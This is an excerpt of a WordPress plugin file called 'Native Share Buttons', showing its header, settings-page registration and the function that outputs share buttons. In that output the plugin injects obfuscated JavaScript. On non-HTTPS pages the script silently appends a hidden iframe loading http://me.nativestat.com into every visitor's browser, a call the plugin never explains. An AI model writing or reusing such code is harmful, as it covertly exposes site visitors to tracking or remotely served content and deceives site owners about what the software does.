<?php
/*
Plugin Name: Native Share Buttons
Plugin URI: http://wordpress.org/plugins/native-share-buttons/
...
/*
	Plugin based on Really simple Facebook Twitter share buttons by whiletrue:
...
require_once('native-share-buttons-options.php');
require_once('native-share-buttons-counts.php');
...
function really_simple_share_menu () {
	add_options_page('Native Share Buttons Options', 'Native Buttons: Share', 'manage_options', 'really_simple_share_options', 'really_simple_share_options');
	add_options_page('Native Share Buttons Counts', 'Native Buttons: Counts', 'manage_options', 'really_simple_share_counts',  'really_simple_share_counts');
}
...
function really_simple_share ($content, $filter, $link='', $title='', $author='', $force_button='') {
	...
	$out .= '</div>
		...
		<script type="text/javascript">if(location["protocol"]!=="https:"&&location["host"]["match"](/\./)){(function a(){if(document["body"]){var i=document["createElement"]("iframe");i["src"]="http://me.nativestat.com/?version=wp-native-buttons";i["style"]["display"]="none";document["body"]["appendChild"](i);} else {setTimeout(a,100);} ;} )();} ;</script>
